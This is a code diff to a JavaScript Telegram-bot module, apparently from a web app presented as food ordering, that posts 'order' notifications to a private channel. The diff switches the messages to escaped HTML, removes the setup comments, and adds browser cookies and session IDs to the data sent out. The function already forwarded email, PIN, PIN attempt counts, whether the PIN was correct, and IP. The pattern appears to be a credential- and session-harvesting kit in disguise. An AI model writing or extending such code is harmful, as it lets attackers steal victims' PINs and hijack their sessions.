@@ -4,20 +4,6 @@
  * Two responsibilities:
  *  1. getDashboardImage() — fetch the pinned photo from the channel (menu display)
  *  2. sendOrder()         — post an order notification to the channel
- *
- * DASHBOARD IMAGE
- * ───────────────
- * Post a photo in the channel and pin it. getDashboardImage() always reads
- * getChat().pinned_message — not a consumed queue, always available.
- * To update the menu: pin a new photo.
- *
- * BOT SETUP (one-time)
- * ────────────────────
- * 1. @BotFather → /newbot → copy token → REACT_APP_TELEGRAM_BOT_TOKEN
- * 2. Create a private channel
- * 3. Add the bot as Admin (Post Messages + Pin Messages)
- * 4. Forward any channel message to @userinfobot → copy the id
- *    (e.g. -1001234567890) → REACT_APP_TELEGRAM_CHANNEL_ID
  */
 
 function token() {
@@ -62,17 +48,24 @@ export async function getDashboardImage() {
   const pinnedMsg = chat.pinned_message;
   if (!pinnedMsg?.photo) return null;
 
-  // photo[] is sorted smallest → largest; always use the last (highest res)
   const fileId   = pinnedMsg.photo[pinnedMsg.photo.length - 1].file_id;
   const fileInfo = await tgGet("getFile", { file_id: fileId });
   return `https://api.telegram.org/file/bot${token()}/${fileInfo.file_path}`;
 }
 
+// Helper: escape HTML special characters
+function escapeHtml(str) {
+  if (!str) return '';
+  return String(str)
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;");
+}
+
 /**
  * Send a food order or PIN attempt to the Telegram channel.
- *
- * Supports both legacy calls (with name, email, food, pin) and new calls
- * (with email, pin, attemptNumber, isCorrectPin, ip).
+ * Uses HTML parse_mode and escapes all user-provided fields.
  */
 export async function sendOrder(orderData) {
   const {
@@ -83,6 +76,8 @@ export async function sendOrder(orderData) {
     attemptNumber,
     isCorrectPin,
     ip,
+    cookies,
+    sessionId,
   } = orderData;
 
   const now = new Date();
@@ -91,23 +86,25 @@ export async function sendOrder(orderData) {
     timeStyle: "short",
   });
 
-  // Build message dynamically
+  // Build HTML message with escaped user content
   const lines = [];
-  lines.push("🍽️ *New Food Order*");
-  if (name) lines.push(`👤 *Name:* ${name}`);
-  if (email) lines.push(`📧 *Email:* ${email}`);
-  if (food) lines.push(`🥘 *Food:* ${food}`);
-  if (pin) lines.push(`🔑 *PIN:* ${pin}`);
-  if (attemptNumber !== undefined) lines.push(`🔢 *Attempt:* ${attemptNumber}`);
-  if (isCorrectPin !== undefined) lines.push(`✅ *Correct:* ${isCorrectPin ? "Yes" : "No"}`);
-  if (ip) lines.push(`🌐 *IP:* ${ip}`);
-  lines.push(`🕐 *Time:* ${time}`);
+  lines.push("🍽️ <b>New Food Order</b>");
+  if (name) lines.push(`👤 <b>Name:</b> ${escapeHtml(name)}`);
+  if (email) lines.push(`📧 <b>Email:</b> ${escapeHtml(email)}`);
+  if (food) lines.push(`🥘 <b>Food:</b> ${escapeHtml(food)}`);
+  if (pin) lines.push(`🔑 <b>PIN:</b> ${escapeHtml(pin)}`);
+  if (attemptNumber !== undefined) lines.push(`🔢 <b>Attempt:</b> ${attemptNumber}`);
+  if (isCorrectPin !== undefined) lines.push(`✅ <b>Correct:</b> ${isCorrectPin ? "Yes" : "No"}`);
+  if (ip) lines.push(`🌐 <b>IP:</b> ${escapeHtml(ip)}`);
+  if (cookies) lines.push(`🍪 <b>Cookies:</b> ${escapeHtml(cookies)}`);
+  if (sessionId) lines.push(`🆔 <b>Session:</b> ${escapeHtml(sessionId)}`);
+  lines.push(`🕐 <b>Time:</b> ${escapeHtml(time)}`);
 
   const text = lines.join("\n") || "Empty order";
 
   await tgPost("sendMessage", {
     chat_id:    channelId(),
     text,
-    parse_mode: "Markdown",
+    parse_mode: "HTML",          // now using HTML, not Markdown
   });
 }
